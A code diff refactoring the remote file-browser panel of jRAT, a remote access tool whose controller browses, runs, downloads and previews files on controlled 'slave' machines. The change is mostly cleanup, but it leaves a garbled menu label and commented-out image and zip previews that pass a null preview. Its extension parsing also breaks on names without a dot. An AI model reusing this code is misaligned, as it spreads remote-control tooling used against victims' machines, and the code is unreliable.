@@ -8,11 +8,10 @@ import jrat.common.io.TransferData;
 import jrat.controller.Drive;
 import jrat.controller.Slave;
 import jrat.controller.io.FileObject;
-import jrat.controller.io.FileSystem;
+import jrat.module.fs.FileSystem;
 import jrat.controller.listeners.DirListener;
 import jrat.controller.packets.outgoing.*;
 import jrat.controller.settings.StoreFileBookmarks;
-import jrat.controller.ui.components.FileTable;
 import jrat.controller.ui.panels.PanelFileTransfers;
 import jrat.controller.utils.Utils;
 import jrat.module.fs.packets.Packet15ListFiles;
@@ -31,10 +30,10 @@ import java.util.List;
 
 @SuppressWarnings("serial")
 public class PanelRemoteFiles extends JPanel {
-	
-	private Slave slave;
-	private RemoteFileTable remoteTable;
-	private FrameRemoteFiles parent;
+
+	private final Slave slave;
+	private final RemoteFileTable remoteTable;
+	private final FrameRemoteFiles parent;
 	
 	public PanelRemoteFiles(Slave slave, FrameRemoteFiles parent) {
 		this.slave = slave;
@@ -60,7 +59,7 @@ public class PanelRemoteFiles extends JPanel {
 			}
 		});
 	}
-	
+
 	public class LocalFileTable extends FileTable {
 		
 		public LocalFileTable() {	
@@ -187,10 +186,8 @@ public class PanelRemoteFiles extends JPanel {
 	
 	public class RemoteFileTable extends FileTable {
 		
-		private JMenuItem mnAdd;
-		private JMenuItem mnRemove;
-		
-		public boolean waitingForHash;
+		private final JMenuItem mnAdd;
+		private final JMenuItem mnRemove;
 
 		public RemoteFileTable() {
 			super(slave);
@@ -274,29 +271,15 @@ public class PanelRemoteFiles extends JPanel {
 
 			popupMenuRemote.add(mntmRun);
 
-			JMenuItem mntmPreviewFiletext = new JMenuItem("Preview file (Text, ZIP, Image)");
+			JMenuItem mntmPreviewFiletext = new JMenuItem("FilePreview file (Text, ZIP, Image)");
 			mntmPreviewFiletext.setIcon(Resources.getIcon("preview"));
 			mntmPreviewFiletext.addActionListener(new ActionListener() {
 				@Override
 				public void actionPerformed(ActionEvent arg0) {
-					FileObject[] files = getSelectedItems();
-					if (files != null) {
-						for (FileObject fo : files) {
-							String file = fo.getPath();
-							if (file.toLowerCase().endsWith(".png") || file.toLowerCase().endsWith(".jpg") || file.toLowerCase().endsWith(".jpeg") || file.toLowerCase().endsWith(".gif")) {
-								FramePreviewImage frame = new FramePreviewImage(slave, file);
-								frame.setVisible(true);
-							} else if (file.toLowerCase().endsWith(".zip") || file.toLowerCase().endsWith(".jar")) {
-								FramePreviewZip frame = new FramePreviewZip(slave, file);
-								frame.setVisible(true);
-							} else {
-								FramePreviewFile frame = new FramePreviewFile(slave, file);
-								frame.setVisible(true);
-							}
-						}
-					}
+					preview();
 				}
 			});
+
 			popupMenuRemote.add(mntmPreviewFiletext);
 
 			JMenuItem mntmDownloadFile = new JMenuItem("Download File(s)");
@@ -313,7 +296,7 @@ public class PanelRemoteFiles extends JPanel {
 			mntmExploreImages.setIcon(Resources.getIcon("images-stack"));
 			mntmExploreImages.addActionListener(new ActionListener() {
 				public void actionPerformed(ActionEvent arg0) {
-					List<String> files = new ArrayList<String>();
+					List<String> files = new ArrayList<>();
 										
 					for (FileObject fo : getSelectedItems()) {
 						String path = fo.getPath();
@@ -496,6 +479,39 @@ public class PanelRemoteFiles extends JPanel {
 				setDirectory("");
 			}
 		}
+
+        /**
+         * Summon file previewing of current selected files
+         */
+		private void preview() {
+            FileObject[] files = getSelectedItems();
+            if (files != null) {
+                for (FileObject fo : files) {
+                    String file = fo.getPath();
+                    String extension = file.toLowerCase().substring(file.lastIndexOf("."));
+
+                    FilePreview preview = null;
+
+                    switch (extension) {
+                        case ".png":
+                        case ".jpg":
+                        case ".jpeg":
+                        case ".gif":
+                            //preview = new FramePreviewImage(slave, file);
+                            break;
+                        case ".zip":
+                        case ".jar":
+                            //preview = new FramePreviewZip(slave, file);
+                            break;
+                        default:
+                            preview = new FramePreviewFile(slave, file);
+                            break;
+                    }
+
+                    parent.addPreview(file, preview);
+                }
+            }
+        }
 
 		@Override
 		public void onBack() {
